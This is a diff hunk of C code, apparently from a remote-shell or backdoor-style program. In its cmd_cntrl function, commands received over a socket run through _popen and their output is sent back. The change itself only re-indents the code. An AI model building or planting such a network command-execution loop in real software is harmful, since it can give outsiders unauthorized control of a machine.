@@ -107,27 +107,24 @@ void cmd_cntrl(SOCKET& sockfd){
 
 					else{
 					fp = _popen(rcv, "rb");
-					if(fp){
-						while(!feof(fp)){
-							if((fgets(cmd, 128, fp)) != NULL){
-								strcat(cmd_send, cmd);
+						if(fp){
+							while(!feof(fp)){
+								if((fgets(cmd, 128, fp)) != NULL){
+									strcat(cmd_send, cmd);
 							
-							}
+								}
 						
-						}
-						if(strlen(cmd_send)){
-							send(sockfd, cmd_send, strlen(cmd_send), 0);
-							continue;
-						}
-						else{
-							send(sockfd, error, strlen(error), 0);
-							continue;
+							}
+							if(strlen(cmd_send)){
+								send(sockfd, cmd_send, strlen(cmd_send), 0);
+								continue;
+							}
+							else{
+								send(sockfd, error, strlen(error), 0);
+								continue;
+							}
 						}
 					}
-					}				
-					
-					
-				
 				}
 			
 			}
